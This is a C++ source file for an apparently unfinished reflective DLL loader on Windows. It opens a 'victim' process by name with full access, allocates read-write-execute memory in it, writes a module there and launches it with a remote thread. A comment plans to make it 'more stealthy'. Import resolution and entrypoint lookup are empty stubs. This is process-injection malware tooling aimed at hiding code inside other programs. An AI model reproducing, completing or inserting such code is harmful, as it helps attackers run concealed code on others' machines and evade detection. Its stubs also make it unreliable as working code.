#include "ReflectiveLoader.hpp"

#include "tlhelp32.h"

ReflectiveLoader::ReflectiveLoader(Pid pid, const ProcessAccess access_rights, const ByteVector& module_bytes) :
	m_victim_process(std::make_unique<Process>(pid, access_rights)),
	m_module_to_inject(resolve_imports_in_victim_process(pid, module_bytes)),
	m_entrypoint_rva(get_entrypoint_from_exports(m_module_to_inject))
{
}

ReflectiveLoader::ReflectiveLoader(const ByteVector& module_bytes) :
	m_victim_process(find_victim_process()),
	m_module_to_inject(resolve_imports_in_victim_process(m_victim_process->get_pid(), module_bytes)),
	m_entrypoint_rva(get_entrypoint_from_exports(m_module_to_inject))
{
}

void ReflectiveLoader::inject_module()
{
	// TODO: change this to be more stealthy
	m_remote_address = m_victim_process->allocate_memory(m_module_to_inject.size(), AllocationType::Commit, Protection::ProtectionReadWriteExecute);
	m_victim_process->write(m_remote_address, m_module_to_inject);
}

void ReflectiveLoader::run_module_in_victim()
{
	m_thread = std::make_unique<Thread>(m_victim_process->get_pid(),
		ThreadCreationFlags::ThreadCreationNone,
		reinterpret_cast<LPTHREAD_START_ROUTINE>(m_remote_address + m_entrypoint_rva),
		reinterpret_cast<LPVOID>(m_remote_address));
}

NO_DISCARD ProcessPtr ReflectiveLoader::find_victim_process()
{
	return std::make_unique<Process>(process_utils::get_pid_by_name(VICTIM_PROCESS.data()), ProcessAccess::AllAccess);
}

NO_DISCARD ByteVector ReflectiveLoader::resolve_imports_in_victim_process(UNUSED(Pid victim_pid), UNUSED(const ByteVector& module_to_inject))
{
	// Use GetProcAddressRemote (right this version) and LoadLibraryEx to resolve the IAT. try to fix relocations
	return {};
}

NO_DISCARD Address64 ReflectiveLoader::get_entrypoint_from_exports(UNUSED(const ByteVector& module_to_inject))
{
	return 0;
}
